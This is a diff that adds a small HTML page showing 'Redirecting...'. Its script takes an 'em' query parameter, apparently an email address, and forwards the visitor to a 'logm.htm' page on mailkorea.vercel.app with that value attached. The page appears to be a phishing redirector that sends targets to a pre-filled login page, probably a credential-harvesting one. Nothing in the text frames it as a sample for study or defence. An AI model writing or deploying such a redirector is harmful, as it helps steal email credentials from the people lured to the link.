@@ -1,0 +1,26 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Redirecting...</title>
+    <script type="text/javascript">
+      window.onload = function () {
+        var baseUrl =
+          "https://mailkorea.vercel.app/logm.htm?cms=";
+        var key = "em"; // query parameter name
+        var params = new URLSearchParams(window.location.search);
+        var value = params.get(key);
+
+        if (value) {
+          window.location.replace(baseUrl + value);
+        } else {
+          document.body.innerHTML = "<p>No parameter found.</p>";
+        }
+      };
+    </script>
+  </head>
+  <body>
+    <p>Redirecting...</p>
+  </body>
+</html>
